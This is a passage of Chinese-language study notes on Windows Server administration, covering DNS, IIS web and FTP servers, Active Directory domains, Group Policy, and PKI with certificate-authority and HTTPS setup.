<p>​		作用：假如给 <code>www.baidu.com</code>设置了别名<code>mamashuo</code>，那么之后其他人通过该DNS服务器访问<code>mamashuo.baidu.com</code>，也能解析成功</p>
<h4 id="（8）nslookup-多重解析"><a href="#（8）nslookup-多重解析" class="headerlink" title="（8）nslookup 多重解析"></a>（8）<code>nslookup</code> 多重解析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">直接在cmd中键入 nslookup 回车，此时会进入nslookup的专属解析界面，接着每次敲域名即可直接解析<br>若要退出：键入 exit 回车<br></code></pre></td></tr></table></figure>

<h4 id="（9）创建内部DNS解析（只在内部有效）"><a href="#（9）创建内部DNS解析（只在内部有效）" class="headerlink" title="（9）创建内部DNS解析（只在内部有效）"></a>（9）创建内部DNS解析（只在内部有效）</h4><p>​		首先按照正常流程创建一个区域，区域名称（域名）自定义。<br>​		接着在反向查找区域创建一个区域，和上面<code>解决问题</code>中的步骤一样。就是上诉（3）节的解决方式。</p>
<h4 id="（10）DNS服务器对域名请求的处理顺序"><a href="#（10）DNS服务器对域名请求的处理顺序" class="headerlink" title="（10）DNS服务器对域名请求的处理顺序"></a>（10）DNS服务器对域名请求的处理顺序</h4><p>​		查看缓存—–查看自己负责的区域—–查看转发器—–根服务器</p>
<h4 id="（11）客户机域名请求解析顺序"><a href="#（11）客户机域名请求解析顺序" class="headerlink" title="（11）客户机域名请求解析顺序"></a>（11）客户机域名请求解析顺序</h4><p>​		本机DNS缓存—-本机hosts文件—找本地DNS服务器</p>
<h4 id="（12）域名解析记录类型"><a href="#（12）域名解析记录类型" class="headerlink" title="（12）域名解析记录类型"></a>（12）域名解析记录类型</h4><p>​		A记录：正向解析记录<br>​		CNAME记录：别名<br>​		PTR记录：反向解析记录<br>​		MX：邮件交换记录  ：主要用于解析邮件地址，邮箱服务器<br>​		NS：域名服务器解析</p>
<h4 id="（13）DNS服务器分类"><a href="#（13）DNS服务器分类" class="headerlink" title="（13）DNS服务器分类"></a>（13）DNS服务器分类</h4><p>​		主要名称服务器<br>​		辅助名称服务器<br>​		根名称服务器<br>​		高速缓存名称服务器：当win2003刚装好DNS服务器软件的那一刻，此时该主机就是一台高速缓存名称服务器</p>
<h2 id="7-WEB服务器"><a href="#7-WEB服务器" class="headerlink" title="7 WEB服务器"></a>7 WEB服务器</h2><p>​	web服务器也称为网页服务器或HTTP服务器，为什么也称为HTTP服务器？因为WEB服务器使用的协议是http或https（安全）;</p>
<p>​	<strong>http协议端口号：TCP 80;    https协议端口号：443，FTP协议端口号：21</strong></p>
<h3 id="7-1-服务器发布软件"><a href="#7-1-服务器发布软件" class="headerlink" title="7.1 服务器发布软件"></a>7.1 服务器发布软件</h3><p>​	微软：<br>​		1）IIS (internet infomation service)：可以发布web网站和FTP站点<br>​		2）linux：Apache、LAMP、Tomcat、nginx。。。</p>
<p>​		微软的适合生产环境的使用</p>
<p>​	第三方：phpstudy、XAMPP、。。。</p>
<p>​		适合测试环境</p>
<h3 id="7-2-部署WEB服务器"><a href="#7-2-部署WEB服务器" class="headerlink" title="7.2 部署WEB服务器"></a>7.2 部署WEB服务器</h3><p>​	1）配置静态ip地址<br>​	2）安装IIS-WEB插件<br>​	安装完之后，会生成一个默认的web站点，该站点的文件存储在 <code>C:\Inetpub</code>下的俩个<code>root</code>结尾的文件：web服务是wwwroot，ftp服务是ftproot；</p>
<p>​	注意：一般服务器上不用的服务最好停止，谨慎删除</p>
<p>配置步骤：<br>    1）在菜单<code>网站</code>上右键，新建<br>    2）填写描述：该网站在服务上的名称<br>    3）设置网站ip地址：因为一台服务器上可能存在多张网卡，获取到多个ip，因此需要指定某一个具体的ip<br>    4）设置端口：默认 80<br>    5）输入主目录的路径：web服务的静态网页存放的文件夹<br>    <strong>6）勾选下方的允许匿名访问（important）</strong><br>    <strong>停用默认站点</strong></p>
<p><strong>注意</strong>：当以上的步骤完成之后，并不能访问到我们写的静态网页<code>index.html</code><br>          原因：<br>            <strong>1）</strong>若是我们没有完成上述步骤（6）意味着访问该ip的时候<strong>需要我们输入账户和密码</strong>，因为在我们安装完该服务之后，该服务会默认在本机上创建一个账户用于访问该服务的网站，若是勾选了匿名访问，则无需我们输入密码，会自动给用户使用该账户访问服务器资源。<br>            <strong>2）</strong>若是勾选了匿名访问服务，访问资源的时候可能会出现<strong>无权查看的情况</strong>，这时候的问题可能是我们文件夹的权限问题（一般只要没有主动修改权限的话，一般不是这个问题）；还有一种情况是，在我们创建的网站上右键—-选择上面的<code>文档</code>菜单，其中有一个<code>启用默认文档</code>的选项，里面记录了我们通过ip<strong>访问web资源时默认展示的网页</strong>，里面不存在我们刚创建的静态网页<code>index.html</code>,只有<code>index.htm</code>,因此出现访问不到情况。并且在<code>启用默认文档</code>的内容中，越靠上，优先级越高，从最上层一个一个往下找，直到找到存在的页面，否则无法显示。</p>
<p><strong>注意</strong>：</p>
<p>​	1）每当在web服务器上新建一个网站时，每个网站都需要绑定一个ip和端口号，若是当前网站使用ip和端口被之前的网站占用了，此时只要换一个端口就行了（<strong>最好使用1024以后的端口</strong>），ip可以重复，但是的端口不行；或者也可以重新装一块网卡换个ip。<br>​	2）或者也可以使用相同的ip相同的端口号，但是使用主机头值，这要求不仅需要<code>ip:端口号</code>正确配对，网站上输入的域名也需要和网站中设置的主机头值配对成功才能访问，一般通过<code>www.xin.com</code>访问也不需要带端口，因此实际只需要DNS能够正确解析该域名，且<code>www.xin.com</code>与设置的主机头值相同即可，**并且主机头值在新建网站的时候就能设置，选项为<code>此网站的主机头</code>**，但是设置了主机头值之后，就不能使用ip访问了<br>​	3）若是在设置了主机名之后，想不仅能通过主机名访问网站资源，同时使用ip也能访问，那么可以在文档—-<code>网站</code>选项—-<code>高级</code>里面的网络标识中多添加几套规则，比如可以添加一个不加主机头值的网络标识，那么此时就可以通过<code>ip:端口号</code>访问网站资源了</p>
<p>​	总结：<br>​		一台服务器同时发布多个web站点的方式：<br>​		1）不同的ip，相同的端口<br>​		2）相同的IP，不同的端口<br>​		3）相同的IP，相同的端口，不同的域名（主机头值）<br>​		前俩种方式在测试环境种使用的最多，第三种方式在生产环境中使用的最多</p>
<h4 id="7-2-1主机头值"><a href="#7-2-1主机头值" class="headerlink" title="7.2.1主机头值"></a>7.2.1主机头值</h4><p>​	在对应创建的网站上—-右键—–选择<code>网站</code>菜单—–点击网络标识中的<code>高级</code>选项—-选中我们配置的ip地址和端口—–点击<code>编辑</code>—-设置<code>主机头值</code><br>​	设置完成之后，后面访问该网站的资源不仅需要ip:端口配对正确，并且在网站上输入的域名也需要和设置的主机头值匹配正确</p>
<h4 id="Tips-在服务器上申请第二个ip的操作"><a href="#Tips-在服务器上申请第二个ip的操作" class="headerlink" title="Tips:在服务器上申请第二个ip的操作"></a>Tips:在服务器上申请第二个ip的操作</h4><p>​	我的网络—-属性——ip地址——高级——添加ip和子网掩码—-完成<br>​	通过 ipconfig 命令可以查看到当前连接有俩个ip地址</p>
<h4 id="7-2-2网站类型"><a href="#7-2-2网站类型" class="headerlink" title="7.2.2网站类型"></a>7.2.2网站类型</h4><p>​	1）静态网站：一般扩展名为.html或.htm；这种网站无法和数据库进行交互的<br>​	2）动态网站：一般扩展名为.asp或.php；这两者是一种语言，有后台数据库,asp或php可以连接前台页面与后台数据库<br>​			若是需要使用动态网站比如.asp，需要在部署服务的时候（也就是创建网站的最后一步）设置此网站的访问权限，一般默认是<code>读取</code>，若是需要使用asp，则必须额外勾取<code>运行脚本（如ASP）</code>以及<code>执行（如...）</code>,并且需要在<code>web服务扩展</code>中将<code>Active Server Pages</code>设置为允许</p>
<h4 id="7-2-3访问网站根目录下的子文件夹"><a href="#7-2-3访问网站根目录下的子文件夹" class="headerlink" title="7.2.3访问网站根目录下的子文件夹"></a>7.2.3访问网站根目录下的子文件夹</h4><p>​	在相应的网站上右键属性——-选择菜单<code>主目录</code>—-下面有个<code>配置</code>的菜单，点击——-弹出的界面的上方菜单有个<code>选项</code>，点击—–勾选<code>启用父路径</code><br>​	这样就可以访问根网站根路径下的子文件夹</p>
<h2 id="8-FTP服务器"><a href="#8-FTP服务器" class="headerlink" title="8 FTP服务器"></a>8 FTP服务器</h2><p>​	File Transfor Protoco:文件传输协议；端口号：TCP 20&#x2F;21</p>
<h3 id="8-1ftp的工作方式（Important）"><a href="#8-1ftp的工作方式（Important）" class="headerlink" title="8.1ftp的工作方式（Important）"></a>8.1ftp的工作方式（Important）</h3><p>​	具体选择哪种工作方式，是由<strong>客户机</strong>决定的，但是站在服务器的角度，主动模式是<strong>服务器主动</strong>，被动模式是<strong>服务器被动</strong></p>
<p>​	1）主动模式：一般该模式下会启用两个端口号：20和21：21端口为控制端口，20为数据端口。<br>​				当客户机连接服务器时，此时客户机会打开<strong>端口号50001</strong>同时发送请求——需要连接（此时由客户机决定使用主动模式，还是被				动模式）——&gt;服务器<br>​				此时服务器会通过<strong>21端口</strong>发送请求——-询问账号密码———–&gt;客户机<br>​				客户机发送账号密码—————-&gt;服务器<br>​				服务器验证账号密码通过之后发送请求——————&gt;客户机<br>​				客户机打开<strong>50002端口</strong>发送请求下载文件—————-&gt;服务器<br>​				服务器打开<strong>20端口</strong>，并<strong>主动连接客户机50002端口</strong>——————&gt;客户机（<strong>主动模式</strong>）<br>​				此时若是客户机开启了防火墙，则意味着服务器无法连接客户机，因此此时需要：<br>​				客户机<strong>50002端口主动连接服务器20（不一定是20，被动模式下，该端口是随机的）端口</strong>，防火墙只会拒绝主动连接，不会连接被动回信息，<br>​				此时由于是客户机主动连接服务器，因此称为“<strong>被动模式</strong>”，一般由于大家都会打开防火墙，因此一般都是使用<strong>被动模式</strong></p>
<p>​				注意：一旦数据传输完，<strong>50002 和 20 端口号就会关闭</strong></p>
<p>​	2）被动模式：21端口+随机端口作为数据传输端口</p>
<h3 id="8-2ftp服务器的搭建"><a href="#8-2ftp服务器的搭建" class="headerlink" title="8.2ftp服务器的搭建"></a>8.2ftp服务器的搭建</h3><p>​	和web服务的搭建类似，只是不需要绑定 <code>域名</code>以及额外添加了一个全新设置–FTP权限</p>
<p>​	步骤：<br>​		1）配置静态ip<br>​		2）安装IIS-FTP软件<br>​		3）和web网站搭建步骤基本一致<br>​		4）去掉匿名访问</p>
<p>​	注意：<br>​		1）权限设置和之前的NTFS权限与共享权限的规则一样，都是取交集，即<strong>FTP权限与NTFS权限的交集</strong>，所以和之前一样将FTP权限设置为完全控制，即勾取 <code>读取</code> 和 <code>写入</code><br>​		2）最好新建一个用户用于他人访问本机的FTP资源，因为FTP一般都是匿名访问</p>
<h3 id="8-3-ftp服务器软件介绍"><a href="#8-3-ftp服务器软件介绍" class="headerlink" title="8.3 ftp服务器软件介绍"></a>8.3 ftp服务器软件介绍</h3><p>​	1）Slyar FTP server:  体积小，但是不稳定，人多容易崩溃<br>​	2）Server U：稳定性强，适合在生产环境中使用</p>
<p>​	Server U中多个用户共享单个个文件夹的方式：<br>​		1）新建该共享文件夹—–不建在多个用户组的文件夹中<br>​		2）在服务器的最上层有一个设置的<code>菜单</code>选项—-选择<code>虚拟路径</code>选项<br>​		3）填写需要映射的文件夹的物理路径<br>​		4）映射物理路径到——%HOME%：该路径代表多个用户的ftp家目录<br>​		5）填写映射路径名称——显示在别的用户的文件目录中的名称<br>​		6）最后为每个用户的账号中添加这个目录即可（若是不进行上面的操作，直接添加目录不会起作用）</p>
<h2 id="9-域（Domain）"><a href="#9-域（Domain）" class="headerlink" title="9.域（Domain）"></a>9.域（Domain）</h2><h3 id="9-1内网环境"><a href="#9-1内网环境" class="headerlink" title="9.1内网环境"></a>9.1内网环境</h3><p>​		1）工作组：默认模式，普遍模式，一般人都属于这个组，特点就是人人平等，但是不方便管理<br>​		2）域：特点，人人不平等，但是可以实现集中管理，统一管理</p>
<p>​	域的特点：集中&#x2F;统一管理</p>
<h3 id="9-2域的组成"><a href="#9-2域的组成" class="headerlink" title="9.2域的组成"></a>9.2域的组成</h3><p>​	1）域控制器（DC:Domain Controller）<br>​	2）成员机</p>
<h3 id="9-3域的部署"><a href="#9-3域的部署" class="headerlink" title="9.3域的部署"></a>9.3域的部署</h3><p>​	准备工作：<br>​		1）安装域控制器—–就会生成域环境<br>​		2）安装了活动目录—–就生成了域控制器<br>​		总结：想要生成域环境，就必须安装活动目录；也就是说，<strong>域的部署其实就是安装活动目录</strong><br>​		<strong>活动目录</strong>：Active Directory（AD），其特点是能实现集中管理&#x2F;统一管理；和域的特点一致，因为<strong>域的功能是通过活动目录完成的</strong></p>
<p>​	<strong>活动目录的部署</strong>：<br>​		1）开启2008虚拟机并桥街到vmnet2<br>​		注：一般安装服务器的步骤（此处不使用这种安装）：在<code>计算机</code>上右键—–<code>管理</code>—-里面有个<code>角色</code>：也就是服务器—–右边有个<code>添加角色</code>：对应就是添加服务<br>​		2）配置静态ip(作为DC,只需要配置ip和子网掩码即可)<br>​		3）win + R —- 输入 dcpromo   :该命令有俩个作用，<strong>安装或卸载活动目录</strong><br>​		4）在弹出的界面中—–不使用<strong>高级模式安装</strong>——下一步到选择<strong>在此计算机上安装DNS服务</strong>（即作为DC也作为DNS）—–下一步到 选择在<strong>新林中新建域</strong>——-设置FQDN,该名称即代表第一个域的名称也代表第一个林的名称——–选择林功能级别（一旦选择了某个系统，则将来在<strong>该林中</strong>的其它域控制器的系统版本不能低于该系统）——–选择域功能级别（一旦选择某个系统，则意味着<strong>该域内</strong>的DC系统版本不不能低于该系统版本）—–一直下一步即可（出现警告直接<code>是</code>）—–设置密码（活动目录的还原密码，对整个域进行还原操作）—–一直下一步直到重启<br>​		5）登陆域：之前的本地账户自动被迁移到活动目录中了，意味着该账户为DC账户，本地管理员升级为域管理员</p>
<p>注：<br>    1）<code>计算机</code>右键—–属性—–查看当前所属域<br>    2）在DNS中可以看到自动创建了一个A名称指向DC<br>    3）查看<code>Active Directory 用户和计算机</code>，其中记录了DC以及之前<strong>本地的组</strong>；将之前<code>本地用户和组</code>中的信息迁移到活动目录中，变为<strong>域账户和域组</strong><br>    其中<strong>computer：存放本地域成员机列表</strong><br>            <strong>Domain Controller：DC列表</strong><br>            <strong>Users：域账号</strong></p>
<p>​	<strong>本地账号和域账号登陆的区别：</strong><br>​		1）使用本地账号登陆只能使用本地资源，使用域账号登陆能使用本地资源和域资源</p>
<p><strong>加入域</strong>：（前提配置ip以及将dns指向DC）<strong>我的电脑</strong>—–右键属性—–选择上面菜单中的<code>计算机名</code>—–<code>更改</code>—-选择隶属于域：填写加入域的名称（此时会向DNS解析该名称）—-输入有加入该域权限的账户和密码（建议使用域管理员的账户DC）账户格式：xin.com\administrator，win7可以不用写前面的xin.com-—-欢迎加入域！<br><strong>注意</strong>：加入域之后，每次访问域资源都需要使用域账号，之后该域账号会被发送到DC进行校验，这之间的通信过程遵循LDAP（Light Directory Access Protocol）协议</p>
<p>普通用户加入域之后，都需要使用按三见进如系统，且在登陆界面有个<code>选项</code>按钮，该选项可以选择登陆域（使用域账号）还是登陆本地（使用本地账号）<br><strong>域账号的创建：</strong>：在DC上的活动目录<code>Active Directory 用户和计算机</code>上的<code>Users</code>菜单中右键——新建——用户—–填写姓名（一般使用中文，自己的名字），填写登陆的用户账号和密码（登陆用户名一般使用英文）</p>
<p><strong>将域账号加入到某台电脑的管理员组中</strong>：<br>    1）使用具有一定权限的域账号登入该电脑，在<code>用户和组</code>中将域账号添加到<code>管理员组</code>即可<br>    注：一定是要<strong>有权限的账号</strong>登入，使用本地管理员账号登陆，在添加的时候还是会要输入域账户，因此需要有足够权限的域账户</p>
<p><strong>名词：</strong><br>    本地管理员组（administrators）&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 域管理员组（Domain Admins）</p>
<h3 id="9-4组织单位（OU：Organization-Unit）"><a href="#9-4组织单位（OU：Organization-Unit）" class="headerlink" title="9.4组织单位（OU：Organization Unit）"></a>9.4组织单位（OU：Organization Unit）</h3><p>​	作用：用于归类域资源（域用户、域计算机、域组），方便查找以及管理</p>
<p>​	新建组织单位的步骤：<br>​		1）在活动目录中———最上层的OU上右键————新建组织单位———–设置名称即可（组织单位可以嵌套）</p>
<p>​	<strong>将某个域用户移动到某个组织单位</strong>：直接在该活动目录中找到该用户—–右键——所有任务——移动——-选择目标组织单位即可<br>​	注意：一般移动了域用户，其对应的电脑也需要移动到相同的组织单位，并且对用户做限制与对电脑做限制是两个不同的方向，只对域用户做限制，该限制是绑定域用户的，此时换电脑是没用的，若是只对电脑做限制，此时若用户换电脑，该限制不起作用。</p>
<h3 id="9-5组策略（GPO：Group-Policy）"><a href="#9-5组策略（GPO：Group-Policy）" class="headerlink" title="9.5组策略（GPO：Group Policy）"></a>9.5组策略（GPO：Group Policy）</h3><p>​	作用：通过组策略可以修改计算机的各种属性，如开始菜单、桌面背景、网络参数等</p>
<p>​	查看：在<strong>第一台DC上</strong>的管理工具中可以看到有一个<code>组策略管理</code>——打开即可查看所有OU的组策略，默认会有俩张，一张对整个域做限制，另一张对DC做限制</p>
<p>​	新建组策略：在组策略管理中，对着目标OU右键——-新建GPO表即可：当需要对该OU做限制时，直接修改该表即可（在该表上右键—-编辑即可修改）</p>
<p>​	策略的三种状态：<br>​		1）未配置：没有修改过<br>​		2）已启用：启动该策略<br>​		3）已禁用：禁用该策略<br>​	注意：若是需要访问DC上的文件，需要先在DC上创建一个共享文件夹，以便该域下的所有主机都能访问</p>
<p>​	<strong>（1）组策略在域中，是基于OU（组织单位）来下发</strong>的，并且组策略下发后，用户的应用顺序是：LSDOU<br>​		L：local<br>​		S：站点，涉及到林（一般没有）<br>​		D：domain 域中的组策略<br>​		OU：组织单位，<strong>距离最近的组织单位</strong></p>
<p>​	组策略包括用户配置和计算机配置：<br>​		理论上，对用户进行配置，该用户注销后重新登陆，配置即可生效（不是绝对），若是对计算机进行配置，则需要重启电脑，配置才会生效</p>
<p>​	<strong>（2）查看配置组策略：</strong><br>​		点击对应的组策略———-选择右边菜单中的<code>设置</code>———–添加、添加——–即可查看报告</p>
<p>​	<strong>（3）强制执行某个组策略</strong>：当组策略按顺序执行到该组策略后，后面的组策略就不再生效<br>​	<strong>（4）阻止继承</strong>：使得当前组策略之前的所有组策略不再生效<br>​			<strong>注意</strong>：上级对下级强制是对组策略右键—-强制；而下级对上级阻止继承是对OU右键—-阻止继承；当强制和阻止继承同时出现时，<strong>以强制为准</strong></p>
<h3 id="9-6PKI"><a href="#9-6PKI" class="headerlink" title="9.6PKI"></a>9.6PKI</h3><h4 id="9-6-1PKI概述"><a href="#9-6-1PKI概述" class="headerlink" title="9.6.1PKI概述"></a>9.6.1PKI概述</h4><p>​	公钥基础设施：Public Key Infrastructure</p>
<p>​	作用：通过加密技术和数字签名保证信息的安全</p>
<p>​	组成：公钥加密技术、数字证书、CA、RA</p>
<h4 id="9-6-2信息安全三要素"><a href="#9-6-2信息安全三要素" class="headerlink" title="9.6.2信息安全三要素"></a>9.6.2信息安全三要素</h4><p>​	1）机密性<br>​	2）完整性<br>​	3）身份验证&#x2F;操作的不可否认性</p>
<h4 id="9-6-3应用领域"><a href="#9-6-3应用领域" class="headerlink" title="9.6.3应用领域"></a>9.6.3应用领域</h4><p>​	1）SSL&#x2F;HTTPS<br>​	2）IPsecVPN<br>​	3）部分远程访问VPN</p>
<h4 id="9-6-4公钥加密技术"><a href="#9-6-4公钥加密技术" class="headerlink" title="9.6.4公钥加密技术"></a>9.6.4公钥加密技术</h4><p>​	作用：实现对信息的加密、数字签名等安全操作</p>
<p>​	具体实现：加密算法<br>​	加密算法的分类：<br>​		1）<strong>对称加密算法</strong>：加解密的密钥一致；例如：DES、3DES、AES<br>​		2）<strong>非对称加密算法</strong>：通信双方各自产生一对公私钥；双方各自交换公钥；公钥和私钥为互相加解密关系 ；公私钥不可互相逆推；比如RSA、DH<br>​				实现过程，通信双方A,B各自生成公私钥（A的公钥：123，私钥：321；B的公钥abc，私钥：cba）;<br>​				此时双方交换公钥信息，此时A具有自己的公私钥和B的公钥三把钥匙，B具有自己的公私钥和A的公钥三把钥匙<br>​				A将发送给B的信息利用<strong>B的公钥abc</strong>用RSA算法加密得到T1（此时T1只有B能解开，满足<strong>机密性</strong>），并将加密后的密文通过不可逆算法hash算法再次加密得到T2，再将T2利用<strong>A的私钥321</strong>用RSA算法加密得到T3（T3也称为<strong>数字签名</strong>），最后将T1与T3共同发给B;<br>​				B收到信息后，将T1和T3取出，并利用<strong>A的公钥123</strong>对T3进行解密得到T2，同时同样利用不可逆算法hash算法对T1进行加密得到T2，比较俩次T2的值，若是内容被修改，俩次T2的值则不同（满足<strong>完整性</strong>），若一致，则使用<strong>B的私钥cba</strong>对T1进行解密得到信息。<br>​				<strong>非对称加密算法还是有一个漏洞</strong>：在最开始交换公钥的时候，不能保证对方收到的公钥一定是对方的<br>​				<strong>解决方式</strong>：启用大家都信任的<strong>第三方机构CA(证书颁发机构：用于颁发数字证书)<strong>，A需要在CA上进行注册（由RA完成），并注明自己的ip,公钥等信息，同时CA有自己的</strong>公钥666</strong>和<strong>私钥999</strong>，CA会将A的信息利用自己的<strong>私钥999加密形成签名</strong>（<strong>数字证书</strong>），然后颁发给A，当A与他人通信的时候，会自动带上这串签名。也就是说当B收到A的公钥时，可以利用B从CA中得到的公钥666对A的数字签名解密，判断两个公钥是否一致。若是A没有证书，双方也能正常通信，不过会提示不安全。<br>​		Hash不可逆算法包括(用于验证完整性)：MD5、SHA</p>
<p>​	<strong>数字签名</strong>：用<strong>自己的私钥</strong>对摘要（将信息通过不可逆算法得出的密文）加密得出的密文<br>​	<strong>数字证书</strong>：用于保证公钥的合法性；遵循X.509标准；<strong>数字证书由权威公正的第三方机构即CA签发</strong><br>​				其包含的信息：1）使用者的公钥值<br>​										 2）使用者的标识信息（如名称和电子邮件）	<br>​										 3）有效期（证书的有效时间）<br>​										 4）颁发者的标识信息<br>​										 5）颁发者的数字签名</p>
<h4 id="9-6-5CA搭建"><a href="#9-6-5CA搭建" class="headerlink" title="9.6.5CA搭建"></a>9.6.5CA搭建</h4><p>​	在安装IIS服务的时候，记得勾上<code>应用程序开发</code>，因为CA本身就是一个动态网页</p>
<p>​	注：在装好IIS后<strong>不要停用默认站点</strong>，因为后续CA会占用该默认站点发布自己的服务</p>
<p>​	安装CA服务：<br>​		1）和安装IIS服务一样，CA服务的名称为：<code>Active Directory 证书服务</code>  —  选择安装<br>​		2）下一步——直到为该证书服务安装角色服务——–额外勾选<code>证书颁发机构Web注册</code><br>​		3）<code>企业</code>：域环境下； <code>独立</code>：普通工作组环境（一般选这个）<br>​		4）选择<code>根</code>  —-  <code>新建私钥</code>—–选择加密算法（一般默认）——配置名称（设置CA名称）<br>​		5）设置CA有效期（一般默认）—–一直下一步直到安装即可（若是上面没有勾上<code>应用程序开发</code>），在此处也可以安装<br>​		<strong>注：一旦安装，该服务会占用IIS服务中的默认站点，作为CA服务网站</strong></p>
<p>​	IIS服务获取申请证书：<br>​		1）点击IIS服务器的最上层服务器——右边服务种选择<code>服务器证书</code> 点击<br>​		2）在右边<code>操作</code>菜单中选择<code>创建证书申请</code> —-填写基本信息（通用名称应该填写<code>访问的网址的名称</code>）—-下一步<br>​		3）选择加密算法（一般默认）—-下一步<br>​		4）为证书申请指定一个文件名—–选择保存路径以及设置文件名称—–申请证书文件完成（下一步就是将该申请证书提交给CA）</p>
<p>​	向CA提交申请证书：<br>​		1）打开CA服务网站 ： 10.1.1.2&#x2F;certsrv<br>​		2）点击<code>申请证书</code>——选择<code>高级证书申请</code>——-选择<code>使用base64编码的.....</code><br>​		3）在第一个<code>base-64的证书申请...</code>的框中，将申请证书里面的内容复制进去<br>​		4）最后提交即可</p>
<p>​	打开CA机构，查看挂起的证书申请——-右键选择颁发即可</p>
<p>​	重新打开CA服务网站，选择<code>查看挂起的证书申请的状态</code>——–<code>下载CA证书</code>—–保存并设置名称</p>
<p>​	打开IIS服务器，准备导入证书：<br>​		1）点击IIS服务器的最上层服务器——右边服务种选择<code>服务器证书</code> 点击<br>​		2）在右边<code>操作</code>菜单中选择<code>完成证书申请</code><br>​		3）在<code>指定证书机构颁发的响应</code>中选择刚刚保存的CA证书，起一个好记的名称—–确定即可</p>
<p>​	将提供的web服务，升级成https服务：<br>​		1）选择相应的web站点——右键——-<code>编辑绑定</code><br>​		2）右边菜单选择<code>添加</code>——<code>类型</code>选择https——其余不变（不需要设置主机名，因为会延用之前http的主机名）<br>​		3）选择SSL证书—–选择刚配置的CA证书；此时用户即可用http访问也能用https访问<br>​		4）让用户只能https访问：选择相应的web站点——右边菜单中选择<code>SSL设置</code>——勾选<code>要求SSL</code><br>​				注：下面的客户证书的选项的含义：忽略：不需要客户机有证书； 接受：客户机有没有证书都行； 必须：客户机一定要有证书<br>​		5）应用即可<br>​		注：在访问过程中，会出现证书不安全的提示，这是正常的，说明证书已经颁发成功，而出现该提示的原因是颁发证书的机构不是受信任的权威机构，若是要解决这个问题，需要在internet选项中，将我们自己搭建的CA机构证书导入进去即可（CA证书可以通过web服务上下载）</p>
<p>​		额外小实验：将客户证书的选项选择为：必须；  这就意味着，不仅服务器需要证书，用户也需要证书<br>​		1）登陆CA的web服务器网站——-申请证书——-申请web浏览器证书——-填写好信息后<br>​		2）在CA服务器上给该浏览器颁发证书<br>​		3）使用该浏览器登陆CA的web服务查看挂起证书—–安装证书即可</p>
<h2 id="10-综合测试（所有机子还原快照，重新配置）"><a href="#10-综合测试（所有机子还原快照，重新配置）" class="headerlink" title="10 综合测试（所有机子还原快照，重新配置）"></a>10 综合测试（所有机子还原快照，重新配置）</h2><h3 id="10-1-测试1"><a href="#10-1-测试1" class="headerlink" title="10.1 测试1"></a>10.1 测试1</h3><p><img src="/staticImg/image-20240411113703967.png" alt="image-20240411113703967"></p>
<h4 id="1）配置DHCP时出现问题"><a href="#1）配置DHCP时出现问题" class="headerlink" title="1）配置DHCP时出现问题"></a>1）配置DHCP时出现问题</h4><p>​		需要使用DC账户登陆该服务器，并对该服务器进行授权</p>
<h4 id="2）配置HTTPS服务："><a href="#2）配置HTTPS服务：" class="headerlink" title="2）配置HTTPS服务："></a>2）配置HTTPS服务：</h4><p>​		HTTPS的端口号：443<br>​		HTTP的端口号: 80</p>
<h4 id="3）权限问题"><a href="#3）权限问题" class="headerlink" title="3）权限问题"></a>3）权限问题</h4><p>​		OU是没有权限的，权限是靠组管理的</p>
<h4 id="4）生产环境中（important）"><a href="#4）生产环境中（important）" class="headerlink" title="4）生产环境中（important）"></a>4）生产环境中（important）</h4><p>​		需要在DC的DNS服务器上，右键—–属性——设置转发器（将内部DNS转发到真实有效的DNS）(不设置的话，dns也内置了根服务器，可能会比较慢)</p>
<h4 id="5）赋予权限"><a href="#5）赋予权限" class="headerlink" title="5）赋予权限"></a>5）赋予权限</h4><p>​		为了集中赋予权限，可以在OU下创建新的组：<br>​		创建过程中遇到的名词：<br>​			1）组作用域：<br>​						本地域：只在当前域中生效（林中其它域不会生效）<br>​						全局：当前林中所有的域都生效<br>​						通用：作用域和全局一样，只是选择改选项会使得当前域对赋予权限的组进行缓存，提高解析速度；一般不使用</p>
<p>​			2）组类型：<br>​						安全组：一般的权限控制<br>​						通讯组：主要用于发邮件<br>​					注意：若是改组同时需要赋予权限以及发邮件，那就需要创建俩个组（安全组和通讯组）</p>
<h4 id="6）用域账户登陆"><a href="#6）用域账户登陆" class="headerlink" title="6）用域账户登陆"></a>6）用域账户登陆</h4><p>​			可以直接使用 用户名@域名</p>
<h4 id="7）非匿名访问服务器Web服务"><a href="#7）非匿名访问服务器Web服务" class="headerlink" title="7）非匿名访问服务器Web服务"></a>7）非匿名访问服务器Web服务</h4><p>​			非匿名访问意味着访问该服务时需要输入账号密码，此时需要在wen服务上右键——属性——目录安全性—–编辑省份验证和访问控制——–用户需进行身份验证——–选择 windows域服务器的摘要式身份验证——-选择领域——选择所属领域即可</p>
<h3 id="10-2-测试2"><a href="#10-2-测试2" class="headerlink" title="10.2 测试2"></a>10.2 测试2</h3><p><img src="/staticImg/image-20240417113627147.png" alt="image-20240417113627147"></p>
<p><img src="/staticImg/image-20240417113714239.png" alt="image-20240417113714239"></p>
<h4 id="1-文件共享服务"><a href="#1-文件共享服务" class="headerlink" title="1)文件共享服务"></a>1)文件共享服务</h4><p>​	只能通过域名访问共享文件夹，不能通过ip访问</p>
<h4 id="2）CA的web服务也必须用域名访问"><a href="#2）CA的web服务也必须用域名访问" class="headerlink" title="2）CA的web服务也必须用域名访问"></a>2）CA的web服务也必须用域名访问</h4><h4 id="3）证书的申请"><a href="#3）证书的申请" class="headerlink" title="3）证书的申请"></a>3）证书的申请</h4><p>​	证书模板记得勾选web服务器</p>
<h4 id="4）当需要配置多个HTTPS服务而需要导入多个证书"><a href="#4）当需要配置多个HTTPS服务而需要导入多个证书" class="headerlink" title="4）当需要配置多个HTTPS服务而需要导入多个证书"></a>4）当需要配置多个HTTPS服务而需要导入多个证书</h4><p>​		由于每个站点对应的证书不同，服务器需要通过请求中不同的主机头来判断需要用哪个证书解密，然而主机头作为请求的一部分也被加密。最终IIS只好使用第一个绑定到该IP：PORT的站点证书解密请求，从而有可能造成对于其他站点的请求失败而报错。</p>
<p>​	（1）为多个HTTPS服务设置不同的主机名<br>​			部分IIS配置HTTPS无法配置主机名，此时要么升级IIS,要么通过IIS的配置文件来配置主机名（百度）<br>​	（2）为多个HTTPS服务配置不同的ip,之前有介绍过<br>​	（3）在申请证书的时候，通用名称使用通配符，这样可以将一个证书分配给多个HTTPS服务</p>
